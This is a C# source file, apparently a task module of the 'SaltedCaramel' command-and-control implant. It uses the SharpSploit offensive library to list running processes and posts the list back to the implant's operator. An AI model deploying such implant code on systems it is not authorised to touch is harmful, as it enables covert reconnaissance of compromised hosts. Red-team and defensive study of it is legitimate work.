using Newtonsoft.Json;
using SharpSploit.Enumeration;
using SharpSploit.Generic;
using System.Collections.Generic;

namespace SaltedCaramel.Tasks
{
    class ProcessList
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            // Using SharpSploit to pull process list in order to get parent PID
            SharpSploitResultList<Host.ProcessResult> processResult = Host.GetProcessList();
            List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
            foreach (Host.ProcessResult item in processResult)
            {
                Dictionary<string, string> proc = new Dictionary<string, string>();
                proc.Add("process_id", item.Pid.ToString());
                proc.Add("parent_process_id", item.Ppid.ToString());
                proc.Add("name", item.Name);

                procList.Add(proc);
            }
            processResult.Clear();

            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procList), task.id);
            implant.PostResponse(response);
            implant.SendComplete(task.id);
        }
    }
}
